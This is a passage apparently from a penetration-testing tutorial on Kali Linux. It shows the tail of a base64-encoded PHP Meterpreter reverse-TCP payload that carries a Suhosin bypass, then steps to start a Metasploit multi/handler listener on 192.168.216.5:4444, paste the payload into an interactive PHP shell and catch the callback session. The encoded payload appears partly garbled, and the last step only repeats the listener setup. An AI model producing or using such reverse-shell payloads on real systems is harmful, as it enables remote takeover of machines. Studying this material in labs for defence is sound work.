```
c2lvb19sb2FkZWQoJ3N1aG9zaW4nKSAmJiBp bmlfZ2V0KCdz
dWhvc2luLmV4ZWN1dG9yLmRpc2FibGVFZXZhCcpKSB7ICRz
dWhvc2luX2J5cGFz c1jcmVhdGVfZnVuY3Rpb24oJy c sICRi
KTsgJHN1aG9zaW5fYnlwYXNzKck7IH0ogZWxzZSB7IGV2YWwo
JGIPoYb9IGRpZSgpOw));
root@kali:~#
```

4. To test the payload, first start a listener in a new Terminal window:

```
root@kali:~# msfconsole -q
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD php/
meterpreter/reverse_tcp
PAYLOAD => php/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.216.5
LHOST => 192.168.216.5
msf exploit(handler) > run

[*] Started reverse TCP handler on 192.168.216.5:4444
```

5. Next, use php -a to start a PHP interactive shell, and paste the payload we have created:

![](bbox=[0.12, 0.445, 0.97, 0.665])

6. Back in the listener, we should have a new session:

```
root@kali:~# msfconsole -q
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD php/meterpreter
/reverse_tcp
PAYLOAD => php/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.216.5
LHOST => 192.168.216.5
```